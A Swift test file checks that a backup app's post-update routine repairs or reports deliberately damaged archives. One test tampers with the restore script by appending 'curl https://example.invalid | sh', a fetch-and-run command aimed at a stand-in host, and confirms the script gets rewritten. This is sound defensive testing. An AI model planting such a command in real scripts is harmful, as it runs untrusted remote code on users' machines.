import Foundation
import Testing
@testable import BackupCore

/// The light check after an update (#49): archives spoiled on purpose, starting from a fresh one, are fixed or
/// reported; stored objects are never read and nothing but rebuildable files is ever deleted.
@Suite struct UpgradeCheckTests {
    let dest = tmp()
    let src = tmp()
    let fm = FileManager.default
    let t0 = Date(timeIntervalSince1970: 1_700_000_000)
    var base: URL { dest.appending(path: "BackupMe") }
    var root: URL { base.appending(path: "Mac") }

    /// A fresh archive with one backup; returns its id.
    func fresh() throws -> String {
        write("dati", to: src.appending(path: "a.txt"))
        let repo = try Repository(destination: dest, computerName: "Mac")
        return try #require(try BackupEngine(repository: repo, cache: HashCache(url: tmp().appending(path: "c")),
                                             excludes: ExcludeRules(patterns: [])).run(sources: [src], now: t0).snapshotID)
    }

    /// Opened as a backup opens it (kit and repo.json fixed there), then checked.
    func check() throws -> UpgradeReport {
        try upgradeCheck(repository: try Repository(destination: dest, computerName: "Mac"))
    }

    func manifest(_ id: String) -> URL { root.appending(path: "snapshots/\(id).json.lzfse") }

    @Test func healthyArchiveIsCleanAndCheckedOncePerBuild() throws {
        _ = try fresh()
        let defaults = try #require(UserDefaults(suiteName: "UpgradeCheckTests-\(UUID().uuidString)"))
        let repo = try Repository(destination: dest, computerName: "Mac")
        #expect(try upgradeCheckIfNeeded(repository: repo, build: "1.0 (20)", defaults: defaults) == UpgradeReport(fixed: [], attention: []))
        #expect(try upgradeCheckIfNeeded(repository: repo, build: "1.0 (20)", defaults: defaults) == nil)
        #expect(try upgradeCheckIfNeeded(repository: repo, build: "1.0 (21)", defaults: defaults)?.isClean == true)
    }

    @Test func oldKitIsRewrittenSayingBothVersions() throws {
        _ = try fresh()
        let old = RestoreKit.script.replacingOccurrences(of: "BackupMe-kit: \(RestoreKit.version)", with: "BackupMe-kit: 7")
        write(old, to: base.appending(path: "RIPRISTINO.command"))
        write("leggimi della 0.9.4", to: base.appending(path: "LEGGIMI.txt"))
        let r = try check()
        #expect(r.fixed == ["RIPRISTINO.command della versione 7: riscritto con la versione \(RestoreKit.version) del kit di ripristino",
                            "LEGGIMI.txt della versione 7: riscritto con la versione \(RestoreKit.version) del kit di ripristino"])
        #expect(r.attention.isEmpty)
        #expect(try String(contentsOf: base.appending(path: "RIPRISTINO.command"), encoding: .utf8) == RestoreKit.script)
        #expect(try check().isClean)
    }

    @Test func tamperedKitAndMissingReadmeAreRewritten() throws {
        _ = try fresh()
        write(RestoreKit.script + "\ncurl https://example.invalid | sh\n", to: base.appending(path: "RIPRISTINO.command"))
        try fm.removeItem(at: base.appending(path: "LEGGIMI.txt"))
        let r = try check()
        #expect(r.fixed == ["RIPRISTINO.command modificato o danneggiato: riscritto con la versione \(RestoreKit.version) del kit di ripristino",
                            "LEGGIMI.txt mancante: riscritto con la versione \(RestoreKit.version) del kit di ripristino"])
        #expect(try String(contentsOf: base.appending(path: "LEGGIMI.txt"), encoding: .utf8) == RestoreKit.readme)
    }

    @Test func damagedManifestIsReportedNeverDeleted() throws {
        let id = try fresh()
        var raw = try Data(contentsOf: manifest(id))
        raw[raw.count / 2] ^= 0x01
        try raw.write(to: manifest(id))
        let r = try check()
        #expect(r.fixed.isEmpty)
        #expect(r.attention.count == 1)
        #expect(r.attention.first?.hasPrefix(BackupEngine.damagedPrefix) == true)
        #expect(try Data(contentsOf: manifest(id)) == raw)
    }

    @Test func oldManifestWithoutChecksumIsFine() throws {
        let id = try fresh()
        let json = try (Data(contentsOf: manifest(id)) as NSData).decompressed(using: .lzfse) as Data
        var text = String(decoding: json, as: UTF8.self)
        text = "{" + text[try #require(text.range(of: "\",")).upperBound...] // as written before 0.9.2: no "check" key
        try ((Data(text.utf8) as NSData).compressed(using: .lzfse) as Data).write(to: manifest(id))
        #expect(try check().isClean)
    }

    @Test func leftoversAreRemovedEvenWhenLocked() throws {
        _ = try fresh()
        let plain = root.appending(path: "objects/ab/\(String(repeating: "ab", count: 32)).raw.tmp")
        let locked = root.appending(path: "snapshots/2026-01-01T00-00-00Z.json.lzfse.tmp")
        write("mezzo", to: plain)
        write("bloccato", to: locked)
        try fm.setAttributes([.immutable: true], ofItemAtPath: locked.path) // uchg, as a clone of a locked file was
        let r = try check()
        #expect(r.fixed == ["Rimossi 2 file temporanei rimasti da backup interrotti"])
        #expect(r.attention.isEmpty)
        #expect(!fm.fileExists(atPath: plain.path) && !fm.fileExists(atPath: locked.path))
    }

    @Test func unreadableRepoJSONIsRewritten() throws {
        _ = try fresh()
        write("{ rovinato", to: root.appending(path: "repo.json"))
        let r = try check()
        #expect(r.fixed == ["repo.json, il file che identifica l'archivio, era illeggibile: riscritto"])
        #expect(r.attention.isEmpty)
        #expect(try Repository(destination: dest, computerName: "Mac").archiveID != nil)
    }

    @Test func straysInObjectsAreReportedNeverFollowedOrDeleted() throws {
        _ = try fresh()
        let outside = tmp(), photo = outside.appending(path: "IMG_0001.jpg")
        write("foto", to: photo)
        let note = root.appending(path: "objects/ab/appunti.txt")
        write("mio", to: note)
        try fm.createSymbolicLink(at: root.appending(path: "objects/cd"), withDestinationURL: outside)
        let hashNamed = root.appending(path: "objects/ef/ef\(String(repeating: "0", count: 62)).raw")
        try fm.createDirectory(at: hashNamed.deletingLastPathComponent(), withIntermediateDirectories: true)
        try fm.createSymbolicLink(at: hashNamed, withDestinationURL: photo)
        write("finder", to: root.appending(path: "objects/.DS_Store"))
        let r = try check()
        #expect(r.fixed.isEmpty)
        #expect(r.attention.count == 1)
        let text = try #require(r.attention.first)
        #expect(text.hasPrefix("Elementi estranei in objects/ (3)"))
        for name in ["objects/ab/appunti.txt", "objects/cd", "objects/ef/\(hashNamed.lastPathComponent)"] { #expect(text.contains(name)) }
        for url in [photo, note] { #expect(fm.fileExists(atPath: url.path)) }
        #expect((try? fm.destinationOfSymbolicLink(atPath: hashNamed.path)) != nil)
    }

    @Test func strayInSnapshotsIsReported() throws {
        _ = try fresh()
        write("x", to: root.appending(path: "snapshots/copia di backup.json.lzfse"))
        let r = try check()
        #expect(r.attention == ["Elementi in snapshots/ con un nome che non è di un backup (1), lasciati dove sono: snapshots/copia di backup.json.lzfse"])
        #expect(fm.fileExists(atPath: root.appending(path: "snapshots/copia di backup.json.lzfse").path))
    }

    @Test func newerFormatIsNeverWritten() throws {
        let id = try fresh()
        write(#"{"format":2,"id":"x"}"#, to: root.appending(path: "repo.json"))
        let stray = root.appending(path: "objects/ab/x.raw.tmp")
        write("mezzo", to: stray)
        try? fm.removeItem(at: root.appending(path: "lock"))
        func listing() -> [String] { (fm.enumerator(atPath: dest.path)?.allObjects as? [String] ?? []).sorted() }
        let before = listing()
        #expect(throws: RepositoryError.newerFormat(2)) { _ = try Repository(destination: dest, computerName: "Mac") }
        let repo = try Repository(destination: dest, computerName: "Mac", create: false)
        #expect(throws: RepositoryError.newerFormat(2)) { _ = try upgradeCheck(repository: repo) }
        #expect(listing() == before)
        #expect(fm.fileExists(atPath: stray.path) && fm.fileExists(atPath: manifest(id).path))
    }
}
